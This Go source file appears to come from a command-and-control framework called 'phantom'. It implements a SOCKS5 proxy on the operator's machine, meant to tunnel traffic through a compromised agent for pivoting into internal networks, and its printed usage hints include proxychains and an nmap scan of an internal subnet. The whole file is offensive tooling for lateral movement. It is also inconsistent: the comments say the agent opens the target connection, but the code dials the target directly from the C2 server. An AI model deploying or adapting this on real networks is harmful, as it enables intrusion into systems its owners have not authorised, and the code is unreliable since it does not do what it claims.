package server

import (
	"context"
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

// ══════════════════════════════════════════
//  C2-TUNNELED SOCKS5 PROXY
// ══════════════════════════════════════════
//
// Architecture:
//   1. Operator runs: phantom [agent] > socks 1080
//   2. C2 server opens 127.0.0.1:1080 on the OPERATOR's machine
//   3. Proxychains/browser connects to 127.0.0.1:1080
//   4. C2 server receives SOCKS connection, creates a task for the agent
//   5. Agent opens the real TCP connection to the target
//   6. Data is relayed: client ↔ C2 server ↔ agent ↔ target

const (
	socks5Ver    = 0x05
	socksNoAuth  = 0x00
	socksCmd     = 0x01
	socksIPv4    = 0x01
	socksDomainT = 0x03
	socksIPv6    = 0x04
	socksSucess  = 0x00
	socksFail    = 0x01

	socksIdleTimeout = 5 * time.Minute
)

// TunnelManager manages C2-side SOCKS proxy tunnels.
type TunnelManager struct {
	mu        sync.RWMutex
	listeners map[string]*SOCKSListener // agentID -> listener
}

// SOCKSListener is a SOCKS5 proxy listener on the C2 server.
type SOCKSListener struct {
	AgentID   string
	AgentName string
	BindAddr  string
	listener  net.Listener
	cancel    context.CancelFunc // cancels all in-flight connections
	mu        sync.Mutex
	connCount int
	server    *Server
}

func NewTunnelManager() *TunnelManager {
	return &TunnelManager{
		listeners: make(map[string]*SOCKSListener),
	}
}

// StartSOCKSTunnel opens a SOCKS5 proxy on the C2 server that tunnels
// traffic through the specified agent.
func (tm *TunnelManager) StartSOCKSTunnel(srv *Server, agentID, agentName, bindAddr string) (string, error) {
	tm.mu.Lock()
	defer tm.mu.Unlock()

	if existing, ok := tm.listeners[agentID]; ok {
		return "", fmt.Errorf("SOCKS tunnel already running for %s on %s", agentName, existing.BindAddr)
	}

	if bindAddr == "" {
		bindAddr = "127.0.0.1:1080"
	}

	listener, err := net.Listen("tcp", bindAddr)
	if err != nil {
		return "", fmt.Errorf("cannot bind SOCKS on %s: %w", bindAddr, err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	sl := &SOCKSListener{
		AgentID:   agentID,
		AgentName: agentName,
		BindAddr:  bindAddr,
		listener:  listener,
		cancel:    cancel,
		server:    srv,
	}

	tm.listeners[agentID] = sl
	go sl.serve(ctx)

	msg := fmt.Sprintf("[+] SOCKS5 proxy started on %s (tunneled through %s)\n"+
		"[+] Configure proxychains:\n"+
		"    echo 'socks5 127.0.0.1 %s' >> /etc/proxychains4.conf\n"+
		"[+] Usage: proxychains nmap -sT -Pn 10.10.20.0/24\n"+
		"[+] Or set browser SOCKS proxy to %s",
		bindAddr, agentName, extractPort(bindAddr), bindAddr)

	return msg, nil
}

// StopSOCKSTunnel stops the SOCKS tunnel for an agent and tears down all
// active relay connections immediately.
func (tm *TunnelManager) StopSOCKSTunnel(agentID string) error {
	tm.mu.Lock()
	defer tm.mu.Unlock()

	sl, ok := tm.listeners[agentID]
	if !ok {
		return fmt.Errorf("no SOCKS tunnel running for this agent")
	}

	// cancel() closes all in-flight handleSOCKS goroutines via context.
	// listener.Close() stops Accept() so serve() exits.
	sl.cancel()
	sl.listener.Close()
	delete(tm.listeners, agentID)
	return nil
}

// ListTunnels returns info about all active tunnels.
func (tm *TunnelManager) ListTunnels() []map[string]string {
	tm.mu.RLock()
	defer tm.mu.RUnlock()

	var result []map[string]string
	for _, sl := range tm.listeners {
		sl.mu.Lock()
		count := sl.connCount
		sl.mu.Unlock()
		result = append(result, map[string]string{
			"agent":       sl.AgentName,
			"bind":        sl.BindAddr,
			"connections": fmt.Sprintf("%d", count),
		})
	}
	return result
}

func (sl *SOCKSListener) serve(ctx context.Context) {
	defer sl.cancel() // ensure context is cancelled if serve exits unexpectedly
	for {
		conn, err := sl.listener.Accept()
		if err != nil {
			// listener was closed (Stop called) — exit cleanly
			return
		}
		sl.mu.Lock()
		sl.connCount++
		sl.mu.Unlock()
		go sl.handleSOCKS(ctx, conn)
	}
}

func (sl *SOCKSListener) handleSOCKS(ctx context.Context, conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	buf := make([]byte, 256)

	// SOCKS5 handshake
	n, err := conn.Read(buf)
	if err != nil || n < 3 || buf[0] != socks5Ver {
		return
	}
	conn.Write([]byte{socks5Ver, socksNoAuth})

	// Read CONNECT request
	n, err = conn.Read(buf)
	if err != nil || n < 7 || buf[1] != socksCmd {
		conn.Write([]byte{socks5Ver, socksFail, 0, socksIPv4, 0, 0, 0, 0, 0, 0})
		return
	}

	// Parse target address
	var targetAddr string
	switch buf[3] {
	case socksIPv4:
		if n < 10 {
			return
		}
		ip := net.IP(buf[4:8])
		port := int(buf[8])<<8 | int(buf[9])
		targetAddr = fmt.Sprintf("%s:%d", ip.String(), port)
	case socksDomainT:
		dLen := int(buf[4])
		if n < 5+dLen+2 {
			return
		}
		domain := string(buf[5 : 5+dLen])
		port := int(buf[5+dLen])<<8 | int(buf[6+dLen])
		targetAddr = fmt.Sprintf("%s:%d", domain, port)
	case socksIPv6:
		if n < 22 {
			return
		}
		ip := net.IP(buf[4:20])
		port := int(buf[20])<<8 | int(buf[21])
		targetAddr = fmt.Sprintf("[%s]:%d", ip.String(), port)
	default:
		conn.Write([]byte{socks5Ver, socksFail, 0, socksIPv4, 0, 0, 0, 0, 0, 0})
		return
	}

	target, err := net.DialTimeout("tcp", targetAddr, 10*time.Second)
	if err != nil {
		conn.Write([]byte{socks5Ver, socksFail, 0, socksIPv4, 0, 0, 0, 0, 0, 0})
		return
	}
	defer target.Close()

	conn.Write([]byte{socks5Ver, socksSucess, 0, socksIPv4, 0, 0, 0, 0, 0, 0})

	// Set idle timeout on relay — prevents goroutine leak if tunnel is stopped
	// while a connection is mid-relay.
	deadline := time.Now().Add(socksIdleTimeout)
	conn.SetDeadline(deadline)
	target.SetDeadline(deadline)

	// Watch for context cancellation (socks stop) and close both sides.
	done := make(chan struct{})
	go func() {
		select {
		case <-ctx.Done():
			conn.Close()
			target.Close()
		case <-done:
		}
	}()

	var wg sync.WaitGroup
	wg.Add(2)
	go func() { defer wg.Done(); io.Copy(target, conn) }()
	go func() { defer wg.Done(); io.Copy(conn, target) }()
	wg.Wait()
	close(done) // unblock the context watcher goroutine
}

func extractPort(addr string) string {
	_, port, err := net.SplitHostPort(addr)
	if err != nil {
		return "1080"
	}
	return port
}
